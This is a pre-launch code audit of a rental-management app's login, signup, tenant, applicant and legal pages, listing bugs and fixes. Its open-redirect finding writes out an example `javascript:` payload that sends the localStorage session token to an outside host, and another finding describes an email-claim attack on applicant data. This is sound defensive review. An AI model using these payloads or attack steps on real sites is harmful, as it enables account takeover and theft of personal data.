# Detailed review: auth, sign-in, public and applicant pages

Part of the 2026-10-09 pre-launch audit (see ../LAUNCH-READINESS.md). Produced by a read-only code review of each page against CLAUDE.md and the live schema. CONFIRMED = traced in code; SUSPECTED = needs a runtime check. Findings marked CONFIRMED were spot-checked by the lead reviewer where noted in ../FUNCTIONAL-AUDIT.md.

# Review A: auth, onboarding, public and applicant pages

Read-only code review, 2026-10-09. Nothing was run against the live database. Every `.from()` column was checked against `schema.txt`, and RLS and constraints were checked against `supabase/rentalgenie-project/migrations/`.

## Inventory

| Page | Purpose | Users | Reached from | Status (code-reviewed) | Value H/M/L | Recommendation | Priority |
|---|---|---|---|---|---|---|---|
| index.html | Marketing home page: features, roadmap, pricing, FAQ | Public | Domain root | Working | H | KEEP. Clean, uses createElement only. Fix the Ask Genie claim in the meta description and the footer tenant link | P2 |
| login.html | Landlord email and password sign-in | Landlord | index, signup, every app page's redirect | Partial | H | IMPROVE. The returnTo check allows open redirects and `javascript:` URLs. Also a fake "Keep me signed in" checkbox, a self-pointing back link, and a testimonial that may be invented | P0 |
| login-select.html | Choose landlord or tenant sign-in | Landlord, tenant | listings, tenant-login, property-finance, property-mortgage-activity | Working | L | MERGE into login.html, which already has a landlord/tenant switcher. Or make it the single "Log in" target everywhere. Ask before deleting: 4 pages link to it | P3 |
| signup.html | Create a landlord account (Supabase signUp) | Landlord | index, login, privacy, terms | Partial | H | IMPROVE. Supabase loads in `<head>`, no emailRedirectTo, no terms consent, and no company is created afterwards (see Notes) | P1 |
| forgot-password.html | Request a reset link and set a new password | Landlord | login | Partial | H | IMPROVE. Supabase loads in `<head>`. Recovery detection can race the client's own URL handling | P1 |
| account.html | Profile, password, notification prefs, workspace, danger zone | Landlord | User menu on every app page | Partial | M | IMPROVE. "Export my data" and "Delete account" do nothing but show a success message. Notification toggles appear to be unused | P1 |
| contact-us.html | Support email (no form) | All | index footer, app footers | Working | M | KEEP. Confirm the rentalgenie.app mailbox exists. Mobile guests get no Log in link | P2 |
| privacy.html | Privacy policy | All | Footers, signup links | Partial | H | IMPROVE before launch. Unfilled placeholders, applicants not covered, hosting provider wrong | P1 |
| terms.html | Terms of service | All | Footers | Partial | H | IMPROVE before launch. Unfilled placeholders. Describes features that don't exist (escrow reconciliation, asking questions of your data) | P1 |
| tenant-login.html | Tenant magic-link sign-in | Tenant | login, login-select, tenant-portal (`?redirect=`) | Partial | H | IMPROVE. `redirect` param is used unvalidated in `location.href`. Supabase loads in `<head>`. Claims tenants can pay rent online | P0 |
| tenant-portal-picker.html | Landlord picks a property to preview its tenant portal | Landlord | User menu and footer on ~15 app pages | Partial | M | IMPROVE. Lists properties from leases only (ignores the properties table and archived_at), unescaped status, wrong localStorage key | P2 |
| applicant-login.html | Applicant magic-link sign-in | Applicant | listings (after applying), my-applications | Working | M | KEEP. Add the safeStorage bootstrap and a label `for` | P3 |
| my-applications.html | Applicant's applications and message threads with landlords | Applicant | applicant-login | Working | M | IMPROVE. Filter by `applicant_user_id`. Also see the claim-by-email risk | P2 |
| listings.html | Public vacancy board with an apply form (anon insert) | Public, applicant | login-select, tenant-login, dashboard, applicant pages | Working | H | KEEP. Escaping and URL handling are careful. All columns match `public_listings` and the anon INSERT grant | P3 |
| tenant-magic-link-email.html | Supabase Auth email template (Go template), not a page | Tenant (email) | Nothing links to it. Deployed publicly by `cp ./*.html` | n/a | L | MOVE to `supabase/templates/` (not deployed). It is also the email applicants receive (see Findings) | P3 |

## Findings

### [P0][CONFIRMED] Open redirect and `javascript:` URL in login returnTo, login.html:554-558, used at 579 and 632
**Problem.** The check is `(raw && !raw.startsWith('http') && raw.startsWith('/') || (raw && !raw.includes('://')))`. The second clause accepts anything without `://`, which lets through:
- `javascript:...`
- `//evil.com` (also passes the first clause)
- `/\evil.com`
- `http:evil.com` (cross-scheme from https, which browsers resolve to http://evil.com)

**Why it matters.** Line 579 redirects an already signed-in user on page load with no click needed. `login.html?returnTo=javascript:fetch('//x/'+localStorage[...])` would run script on the origin that holds the Supabase session token, which is account takeover. Whether `location.replace('javascript:…')` executes needs a runtime check in target browsers (Chromium and Firefox do execute it). The `//evil.com` redirect is a ready-made phishing vector either way.

**Evidence.** Line 556: `var returnTo = (raw && !raw.startsWith('http') && raw.startsWith('/') || (raw && !raw.includes('://'))) ? raw : 'dashboard.html';`

**Smallest fix.** Parse it as `var u = new URL(raw, location.href)`. Accept only `u.origin === location.origin`, then redirect to `u.pathname + u.search + u.hash`. Otherwise use `dashboard.html`.

### [P0][CONFIRMED] Unvalidated `redirect` param in tenant-login, tenant-login.html:599, 624, 651
**Problem.** `redirectParam = qp('redirect')` goes straight into `location.href = redirectParam` (651). It runs automatically on load when a session exists (`getSession`, line ~666) and on `SIGNED_IN`. It is also passed as `emailRedirectTo` (624).

**Why it matters.** This is the same open redirect and `javascript:` problem, on the page tenants arrive at from email links.

**Evidence.** Line 651: `if (redirectParam) { location.href = redirectParam; return; }`

**Smallest fix.** Use the same same-origin `URL` check as login.html. Note that tenant-portal.html:831 passes an absolute same-origin URL, so the check must allow same-origin absolute URLs.

### [P1][CONFIRMED] Supabase client loaded in `<head>`, signup.html:7, forgot-password.html:7, tenant-login.html:29
**Problem.** CLAUDE.md hard rule #1. In `<head>`, the script triggers browser tracking prevention, which blocks local storage and leaves the auth session empty.

**Why it matters.** These are three of the four pages that create a session. On tenant-login the magic-link session can appear to vanish, and "Check my session" says "No active session". On forgot-password the recovery session can be lost before `updateUser`.

**Evidence.** For example, tenant-login.html:29: `<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>`, inside `<head>`.

**Smallest fix.** Move the tag to just after `<body>`, as login.html:388 already does.

### [P1][CONFIRMED] "Export my data" and "Delete account" are fake, account.html:1107-1117
**Problem.** Both buttons only call `showAlert`. Nothing is stored, emailed or queued. The delete button says "Account deletion request submitted. Our team will process it within 30 days."

**Why it matters.** The privacy policy (§9, §11) promises deletion within 30 days on request. A user who clicks this believes they made a legally meaningful request that nobody ever receives. This is a privacy-law exposure (CCPA and similar state laws).

**Evidence.** `document.getElementById('dangerExport').addEventListener('click',function(){ showAlert('success','Export requested. You will receive an email when your data is ready.'); });`

**Smallest fix.** Replace both with `mailto:support@…?subject=Delete my account` links, or insert a row into a requests table that n8n picks up. Remove the success text until the request is actually recorded.

### [P1][CONFIRMED] Legal pages ship with unfilled placeholders, privacy.html:221, 335 and terms.html:221, 317, 330
**Problem.** The pages literally show `[LEGAL ENTITY NAME]`, `[STATE]`, `[COUNTY]` and `[MAILING ADDRESS]`, highlighted with `<mark class="fill">`.

**Why it matters.** The documents are unenforceable and look unfinished at launch.

**Smallest fix.** Fill in the values and remove the `<mark>` styling.

### [P1][CONFIRMED] Privacy policy and terms don't cover rental applicants, privacy.html section 2 (~line 224), terms.html §5
**Problem.** listings.html:688-708 collects applicant data from anonymous visitors: income, employer, current address, emergency contact, pet details and screening consent. The policy only names landlords, tenants and visitors. It never says that applications go to the listing landlord, how long they are kept, or anything about screening.

**Why it matters.** Applicant data is sensitive and the people submitting it are not account holders.

**Smallest fix.** Add an "Applicants" bullet under §2 and §3, a sharing line under §6/§7, and a retention line.

### [P1][CONFIRMED] Tenant login promises online rent payment, tenant-login.html:422, 430
**Problem.** The page says "View your lease, pay rent…" and "Pay rent & track your balance". CLAUDE.md lists online payments as not built, and index.html's own FAQ says "Not yet".

**Why it matters.** It is a false feature claim, shown to tenants.

**Smallest fix.** Change it to "See how to pay rent and track your payment history". Also drop "Real-time updates" (line 433), since there is no realtime feature.

### [P1][SUSPECTED] Testimonials may be invented, login.html:421-428 ("Jimmy T., 7 properties · Florida") and tenant-login.html:439-446 ("Sarah R., Tenant · Orlando, FL")
**Problem.** The product is in early access and index.html is recruiting "founding landlords". Named testimonials at this stage are probably placeholders.

**Why it matters.** Fake reviews are an FTC issue, and they contradict the honest tone of index.html.

**Smallest fix.** Confirm the quotes are real and used with consent, or remove the `.brand-testi` blocks.

### [P1][SUSPECTED] Signing up creates no workspace (company), signup.html:173
**Problem.** `signUp` stores only user metadata. No page, trigger or function in the repo inserts into `companies` or `company_members`. A search of all `*.html`, `shared/js` and `supabase/` found no insert. dashboard.html:3740-3752 just falls back to `activeCompanyId = null`.

**Why it matters.** A brand-new landlord has no `company_id`. Pages that scope by company, and the RLS helpers `rg_company_access(company_id)`, may then return nothing or block inserts. That is the "logged in but empty" symptom, hit by every new user.

**Evidence.** There is no `insert into public.companies` anywhere. The `companies_insert_authenticated` policy exists, but nothing calls it.

**Smallest fix.** Needs a runtime check with a fresh test account. If confirmed, add an `on auth.users` insert trigger, or a first-login RPC, that creates the company and the owner `company_members` row.

### [P1][SUSPECTED] Applications can be claimed with an unverified email, `claim_my_applications` (rg_02_functions.sql:145), called from my-applications.html:113
**Problem.** The function links every application whose `applicant_email` matches `auth.users.email`, without checking `email_confirmed_at`.

**Why it matters.** If "Confirm email" is off in Supabase Auth, anyone can register the victim's email on signup.html with a password, open my-applications.html, and read the victim's applications: income, employer, address, phone and messages.

**Smallest fix.** Add `and email_confirmed_at is not null` to the email lookup. Also verify that email confirmation is on.

### [P2][SUSPECTED] Recovery-link detection races the client, forgot-password.html:166-186
**Problem.** The client is created with `detectSessionInUrl:true`, which consumes and then clears the `#access_token` hash, or exchanges `?code=`. The page then also reads the hash or calls `exchangeCodeForSession(code)` itself on DOMContentLoaded.

**Why it matters.** With PKCE, the second exchange fails, so the user sees "This reset link is invalid or has expired". With the implicit flow, if the client clears the hash first, the reset form never appears.

**Smallest fix.** Use `db.auth.onAuthStateChange((e)=>{ if(e==='PASSWORD_RECOVERY') showResetUI(); })` and drop the manual parsing.

### [P2][CONFIRMED] Signup doesn't set emailRedirectTo and has no terms consent, signup.html:173
**Problem.** Without `emailRedirectTo`, the confirmation link goes to whatever Site URL is configured in Supabase. The form also has no checkbox or text accepting the Terms and Privacy Policy, although terms.html §1 says "By creating an account… you agree".

**Smallest fix.** Pass `options.emailRedirectTo: location.origin + '/login.html'` and add an "I agree to the Terms and Privacy Policy" line. Minor: the password minimum is 6 here but 8 on forgot-password and account.

### [P2][CONFIRMED] my-applications shows a landlord's incoming applications as "My Applications", my-applications.html:121-124
**Problem.** `.from("applications").select("*")` has no filter. The RLS policy "landlords manage their applications" also returns every application on the landlord's own properties.

**Why it matters.** A landlord (or a landlord who is also an applicant) sees other people's applications here. Sending a message from that view fails RLS, because the insert requires `applicant_user_id = auth.uid()`.

**Smallest fix.** Add `.eq('applicant_user_id', session.user.id)`.

### [P2][CONFIRMED] Lease status is unescaped in innerHTML, tenant-portal-picker.html:332
**Problem.** `return '<span class="meta-chip plain">' + (status || 'Unknown') + '</span>';` is fed into `grid.innerHTML` (line 339). `leases.status` is free text with no check constraint. The other fields are passed through `escHtml`.

**Why it matters.** The value is the landlord's own data, so the risk is low, but it breaks the CLAUDE.md escaping rule.

**Smallest fix.** Wrap it: `escHtml(status || 'Unknown')`.

### [P2][CONFIRMED] Tenant portal picker queries the wrong source, tenant-portal-picker.html:392, 409-420
**Problem.**
- The comment says there is "no separate properties table", but there is one. Properties without a lease never appear.
- Archived leases are not excluded (no `archived_at` filter).
- Properties are grouped by `property_name` rather than `property_id`.
- It reads localStorage `rg_company_id`, while every other page uses `rg_active_company_id`, so the user's chosen company is ignored.
- It redirects to `login.html` with no `returnTo` (line 387).

The columns themselves are all valid.

**Smallest fix.** Use the key `rg_active_company_id`, add `.is('archived_at', null)`, and ideally query `properties` instead.

### [P2][CONFIRMED] Login "Back to role selection" points at itself, login.html:520
**Evidence.** `<a href="login.html">← Back to role selection</a>`. It should go to `login-select.html`, or the link should be removed. In the same file:
- The "Keep me signed in" checkbox (478) is never read, so the session always persists.
- After an error the button text becomes "✅ Sign in" instead of the original label (639).
- The password is `.trim()`med (611), so passwords with leading or trailing spaces can never sign in.

### [P2][CONFIRMED] login-select passes `returnTo`, which tenant-login ignores, login-select.html:196-207
**Problem.** tenant-login reads only `redirect`, so the destination is lost when a user goes through role selection.

**Smallest fix.** Make tenant-login also accept `returnTo`, after the validation fix above.

### [P2][SUSPECTED] Notification preferences are saved but nothing reads them, account.html:1084-1104
**Problem.** The toggles are written to `user_metadata.notifications`. The repo's n8n exports (`json/*.json`) and Edge Functions never reference them.

**Why it matters.** Users who turn off reminders may still get them, or users may expect emails that never send.

**Smallest fix.** Check the live n8n workflows. If they don't read these settings, mark the toggles "coming soon" or hide them.

### [P2][CONFIRMED] Workspace tab says "Not linked" for owners without a member row, account.html:990-1017
**Problem.** The tab resolves the company only through `company_members`. Unlike dashboard.html:3749, it never falls back to `companies.owner_user_id`.

**Smallest fix.** Add the same owner fallback.

### [P2][CONFIRMED] Marketing and legal copy describe features that don't exist
- terms.html:256 lists "escrow reconciliations". CLAUDE.md says escrow reconciliation doesn't exist.
- terms.html:226 says users can "ask questions about their data", and index.html:7 (meta description) says "ask questions about their numbers in plain English". Ask Genie is "coming soon" everywhere else.
- index.html:258, 472, the plan cards (~411-437) and terms.html:271 describe a 3-property Free plan and Pro-only features, but no limits or gating exist (CLAUDE.md known gap). This is acceptable as early-access marketing, but the terms should say limits are not yet enforced.

**Fix.** Edit the copy.

### [P2][CONFIRMED] Privacy policy names the wrong hosting provider, privacy.html:288
**Problem.** It lists "Cloudflare (hosting and network security)". CLAUDE.md says the site is hosted on Bluehost, with Cloudflare in front. Bluehost should be listed as a service provider.

### [P2][CONFIRMED] Contact page has no Log in link for mobile guests, contact-us.html:56, 188
**Problem.** At ≤900px `#nav-login` is hidden, and `#mobileLogin` starts as `display:none`. The script only ever hides it again (305), never shows it for guests. privacy.html and terms.html solve this with `body.auth-guest #mobileLogin{display:block!important}`; contact-us.html lacks that rule. Its drawer also shows landlord app links to logged-out visitors.

**Smallest fix.** Copy privacy.html:97-99, including the `app-only` and `guest-only` classes.

### [P2][SUSPECTED] Applicants get a "Tenant Portal" email, tenant-magic-link-email.html
**Problem.** Supabase has one Magic Link template per project. applicant-login.html:103 and tenant-login.html:681 both use `signInWithOtp`, so if this template is the one configured, applicants receive "Log in to your Rental Genie tenant portal".

**Smallest fix.** Make the generic branch neutral ("Here's your Rental Genie sign-in link").

Also: this template is deployed publicly as a page, because the workflow runs `cp ./*.html site/`. Move it out of the repo root. Check too whether Supabase renders `{{ .Data.invited_by }}` HTML-escaped, since the inviting landlord controls that value.

### [P2][CONFIRMED] Missing `overflow-x: hidden` (CLAUDE.md UI standard)
**Problem.** No `overflow-x:hidden` on `body` in: login.html, login-select.html, signup.html, forgot-password.html, account.html, contact-us.html, privacy.html, terms.html, tenant-login.html, tenant-portal-picker.html, applicant-login.html. It is present only in index, my-applications and listings.

signup.html:14 and forgot-password.html:14 also use `margin-left:calc(50% - 50vw)` on the header. That can cause sideways scroll on desktop when a vertical scrollbar is showing (SUSPECTED).

### [P2][CONFIRMED] Full-screen loading overlay on account.html, account.html:357, 420
**Problem.** The page uses a full-screen `#authOverlay`. CLAUDE.md's UI standard is a 3px top shimmer bar, never a full-screen overlay.

### [P3][CONFIRMED] Smaller items
- Application status and message sender role go into HTML unescaped (`${a.status}` at my-applications.html:146, `${m.sender_role}` at 199). Not exploitable, because CHECK constraints limit both to fixed values (rg_01_tables.sql:586, 588). Escape them anyway for consistency.
- applicant-login.html:73 and my-applications.html:88 create the client without the safeStorage wrapper or `_rgClient` reuse. If local storage is blocked, the session is lost between the two pages. my-applications also uses only `getSession()`, with no `getUser()` first.
- tenant-login.html:21 links `/manifest.json`, which doesn't exist (404). login.html uses `/shared/manifest.json`.
- tenant-login.html:681 calls `signInWithOtp` without `shouldCreateUser:false`, so any email creates an auth user and lands in an empty tenant portal. If this is intended, show a "no lease found for this email" state.
- index.html:496 footer "Tenant portal" points to tenant-portal.html. tenant-login.html would be a better target.
- listings.html:261 "List Your Property" goes to login-select. signup.html would be better. Line 270 says "updated in real time", but the page loads once.
- account.html:770: the Quick Links "Messages" anchor is missing `class="btn-secondary"`, so it renders as a plain link. Line 976 updates a non-existent `#usernameLabel`, so the user-menu name doesn't refresh after a profile save.
- signup.html:62-75 and forgot-password.html:68-71: logged-out visitors see app links (Dashboard, Property Management, Lease & Rent Center), and the labels are the old ones, not the canonical six. account.html:443-451 and contact-us.html:131-139 add a seventh desktop label, "Messages". dashboard.html's desktop nav has six, though its drawer also includes Messages.
- Every page loads `@supabase/supabase-js@2` as a floating major version. Pin an exact version.

### Pages that look fine
- **index.html**: no Supabase, all dynamic DOM built with `createElement` and `textContent`, responsive. Only the copy issues above.
- **listings.html**: all `public_listings` columns exist. The insert sends only columns in the anon INSERT grant (rg_08:91-95). Photo and apply URLs are limited to http(s) with `new URL` plus a protocol check. The contact email and phone use `createElement`. The numeric fields interpolated into the grid (`bedrooms`, `bathrooms`, `square_feet`) are numeric or integer columns, so they are safe. `target="_blank"` is used only on the external apply link, which is allowed. Load errors show a message.

## Notes
- **Schema check.** Every query on these pages uses valid columns:
  - account: `company_members(company_id, role, created_at, user_id)`, `companies(id, name)`
  - picker: `leases(property_name, tenant_name, tenant_email, rent_amount, status, lease_start, lease_end, company_id)`, `company_members.company_id`, `companies(id, owner_user_id)`
  - tenant-login: `leases(property_name, lease_start, status, tenant_email)`
  - my-applications: `applications.*` ordered by `created_at`; `application_messages(application_id, sender_role, message, created_at)`
  - listings: `public_listings.*`; the `applications` insert columns

  No silent-failure column bugs were found in this group.
- **Auth bootstrap.** Only account.html is close to the reference order (`getUser` then `getSession`, then the auth-ready/guest classes, then a redirect with `returnTo`). Even it uses a full-screen overlay instead of the shimmer bar, and it has no `waitForClientReady`.
- **Three sign-in front doors** exist: login-select, login (with its own role switcher) and tenant-login, plus applicant-login. They overlap. Making login-select the single "Log in" target, with three cards (Landlord, Tenant, Applicant), would remove the back-link confusion. Alternatively, retire it and point its four inbound links at login.html.
- **Support address.** The support email is `support@rentalgenie.app` across 9 places, but the site is rentalgenieai.com. Confirm that mailbox receives mail before launch.
- **Most urgent before launch:**
  1. The two redirect-validation fixes (P0). They are small and self-contained.
  2. Fill in the legal placeholders.
  3. Make the account delete/export buttons honest.
  4. Verify with a fresh test signup that a new landlord gets a working company.
